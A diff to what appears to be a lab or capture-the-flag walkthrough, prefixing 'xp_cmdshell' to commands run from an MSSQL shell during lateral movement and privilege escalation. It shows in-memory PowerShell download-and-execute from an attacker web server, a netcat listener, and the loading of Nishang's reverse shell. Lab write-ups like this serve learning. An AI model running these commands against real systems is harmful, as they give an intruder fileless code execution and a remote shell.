@@ -148,8 +148,8 @@ Invoke-Command -Computername DC1 -Credential $Credential -Scriptblock { whoami }
 ```
 replacing `whoami` with whatever command I want to execute as `miscsvc`
 
-From the MSSQLshell I'll use the command:
-`powershell Invoke-Expression(Invoke-WebRequest http://10.10.14.43/command.ps1 -UseBasicParsing)` which will retrieve the file from my webserver and `Invoke-Expression` will execute the command immediately in memory so nothing touches disk.
+From the MSSQL shell I'll use the command:
+`xp_cmdshell powershell Invoke-Expression(Invoke-WebRequest http://10.10.14.43/command.ps1 -UseBasicParsing)` which will retrieve the file from my webserver and `Invoke-Expression` will execute the command immediately in memory so nothing touches disk.
 
 On the webserver I get a hit
 
@@ -167,4 +167,4 @@ Privilege Escalation
 --------------------
 Now I'll get a shell on the box as `sqlsvc` so that I can use `SeImpersonatePrivilege`
 
-To do this I'll run `rlwrap nc -nvlp 8000` to start a netcat listener on port 8000, while hosting Nishang's `Invoke-PowerShellTcp.ps1` reverse shell on a webserver then execute `IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43/Invoke-PowerShellTcp.ps1')` from the MSSQL instance. 
+To do this I'll run `rlwrap nc -nvlp 8000` to start a netcat listener on port 8000, while hosting Nishang's `Invoke-PowerShellTcp.ps1` reverse shell on a webserver then execute `xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.43/Invoke-PowerShellTcp.ps1')` from the MSSQL instance. 
